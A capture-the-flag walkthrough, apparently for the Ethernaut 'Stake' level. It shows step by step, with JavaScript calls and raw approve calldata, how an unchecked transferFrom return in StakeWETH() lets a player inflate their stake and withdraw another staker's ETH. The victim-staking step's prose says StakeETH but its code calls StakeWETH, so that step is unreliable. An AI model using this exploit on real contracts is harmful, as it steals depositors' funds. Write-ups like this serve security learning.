# Answer

Goal:

1. Stake contract ETH balance should be >0
2. `totalStaked` > Stake contract ETH balance
3. Player must be a staker
4. Player staked balance must equal 0.

## 1. Become a staker

One of the requirements is to be a staker, it's pretty easy to become one - just stake some ETH (>0.001ETH):

```js
await contract.StakeETH('5000000000000000')
```

This will also increase the contract ETH balance. Points [1] and [3] - done.

## 2. Creating ETH disbalance

The main vulnerability of the contract is right here in `StakeWETH()` function:

```solidity
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount)); // <-- VULNERABILITY
        Stakers[msg.sender] = true;
        return transfered;
    }
```

Even if `transfered` is false, it is not checked only returned. So if the function is called directly the value will not matter. And our staked balance `UserStake[msg.sender]` will become larger than the actual staked amount.

But before we call this function we need to pass the previous call which checks for allowance. Even if we don't have any balance of this token, we can approve as much as we want:

```javascript
await sendTransaction({
  from: player,
  to: '<WETH address>',
  data: '095ea7b3000000000000000000000000<Stake address>000000000000000000001aba4714957d300d0e549208b31adb0fffffffffffff', // <- `approve` selector with quantity larger than StakeWeth `amount` argument
})
```

After this we are free to bloat our stake as much as we want, so we double:

```javascript
await contract.StakeWETH('5000000000000000')
```

Point [2] - done.

## 3. Stealing funds and setting player staked balance to 0

But now we are in trouble. The contract actually has 0.005 ETH from our `StakeETH()` call but the player `UserStake` is double that size (0.01 ETH), because of the malicious `StakeWETH()` call. To be able to reset our `UserStake` balance to zero, we need someone also to stake actual ETH. Atleast with the amount to cover our `UserStake` and some extra so that after the withdrawal, the [1] point of the requirements wouldn't be violated. To do this we set our wallet to a different address and call `StakeETH` again:

```javascript
await contract.StakeWETH('6000000000000000')
```

Now:

- `UserStake[player]` -> 0.01 ETH (0.005 ETH - from StakeETH and 0.005 ETH from StakeWETH)
- `UserStake[victim]` -> 0.006 ETH
- `totalStaked` -> 0.016 ETH
- Contract ETH balance -> 0.011 ETH

We can freely `Unstake()` our whole amount by stealing a piece of the other staker (victim) ETH.

```javascript
await contract.Unstake('10000000000000000')
```

Points [4] - done and all points covered!
